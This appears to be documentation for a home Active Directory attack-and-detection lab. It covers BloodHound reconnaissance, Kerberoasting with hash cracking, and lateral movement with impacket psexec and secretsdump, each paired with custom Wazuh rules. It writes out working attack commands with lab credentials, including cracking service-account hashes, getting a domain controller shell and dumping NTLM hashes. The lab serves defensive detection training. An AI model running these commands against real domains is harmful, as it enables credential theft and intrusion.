
# ⚔️ Attack Scenarios

This document describes the offensive operations performed in the lab. All attacks are mapped to **MITRE ATT&CK** techniques and are detected by **custom Wazuh rules**.

> ⚠️ **For educational use only. Never run these attacks against systems you do not own.**

---

## Scenario 1 — BloodHound Reconnaissance

**MITRE ATT&CK:** T1087 (Account Discovery), T1069 (Permission Groups Discovery)

### Steps

#### 1. Start Neo4j and BloodHound on Kali:
sudo neo4j start
sleep 10
bloodhound &

####  2. On CLIENT01, run SharpHound:
cd C:\Users\user1\Desktop
.\SharpHound.exe -c All --Domain lab.local --Stealth

#### 3. Copy the generated .zip file to Kali (via SCP or shared folder).

#### 4. Import the .zip into BloodHound and analyze the graph

## Expected Findings
- Paths to Domain Admin
- Kerberoastable accounts
- Unconstrained delegation
- Sessions on privileged accounts

## Wazuh Detection
- Rule 100000 — Base Kerberos TGS request
- Rule 100003 — svc_sql target detected

--- 

## Scenario 2 — Kerberoasting
**MITRE ATT&CK:**  T1558.003 (Kerberoasting)

### Steps

#### 1. Enumerate SPNs and request TGS tickets:
GetUserSPNs.py lab.local/user1:User@1234 -dc-ip 192.168.100.10 -request -outputfile kerberoast_hash.txt

#### 2. Crack the hash with John:
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hash.txt

#### 3. Or with Hashcat:
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt --show

## Expected Result
- Hash for svc_sql is cracked
- Password: P@ssw0rd123

## Wazuh Detection
Rule ID	Level	Description
100001	12	Kerberoasting — RC4 TGS request (Event ID 4769, ticketEncryptionType = 0x17)
100002	12	Kerberoasting — Multiple RC4 TGS requests from same source
100003	10	svc_sql service account requested TGS ticket

All three rules are tagged with MITRE ATT&CK T1558.003.

---

## Scenario 3 — Lateral Movement
**MITRE ATT&CK: ** T1550.002 (Pass the Hash), T1021.002 (SMB/Windows Admin Shares)

### Steps
#### 1. Get a shell on the DC:
impacket-psexec lab.local/svc_sql:'P@ssw0rd123'@192.168.100.10

#### 2. Or dump secrets:
impacket-secretsdump lab.local/svc_sql:'P@ssw0rd123'@192.168.100.10

## Expected Result
- Interactive shell on DC01
- NTLM hashes of domain users dumped

## Wazuh Detection
Rule ID	Level	Description
100005	12	Possible Pass-the-Hash — NTLM network logon (Event ID 4624, logonType 3)


## Full Attack Chain (Automated)
Use the script:
./scripts/bash/attack-full.sh

This performs:
- Kerberoasting
- Hash cracking
- Lateral movement (if password found)

Then verify detection:
./scripts/bash/test-wazuh-detection.sh

